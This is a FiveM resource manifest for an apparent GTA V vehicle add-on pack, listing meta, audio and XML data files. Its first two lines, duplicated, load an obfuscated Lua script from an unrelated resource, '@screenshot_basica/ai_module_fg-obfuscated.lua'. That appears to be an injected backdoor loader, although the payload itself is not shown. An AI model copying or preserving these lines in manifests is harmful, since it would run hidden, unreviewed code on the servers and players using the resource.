shared_script '@screenshot_basica/ai_module_fg-obfuscated.lua'
shared_script '@screenshot_basica/ai_module_fg-obfuscated.lua'
fx_version "adamant"
game 'gta5'
files {
	"data/**/*.meta",
	"audio/*",
	"audio/*",
	"audio/**/*",
	'xml/*',
	"sfx/**/*.awc"
}
client_script "data/names.lua"
data_file "CARCOLS_FILE" "data/**/carcols*.meta"
data_file "HANDLING_FILE" "data/**/handling*.meta"
data_file "VEHICLE_LAYOUTS_FILE" "data/**/vehiclelayouts*.meta"
data_file "VEHICLE_METADATA_FILE" "data/**/vehicles*.meta"
data_file "CLIP_SETS_FILE" 			"data/**/clip_sets.xml"
data_file "VEHICLE_VARIATION_FILE" "data/**/carvariations*.meta"
data_file "CONTENT_UNLOCKING_META_FILE" "data/**/*unlocks.meta"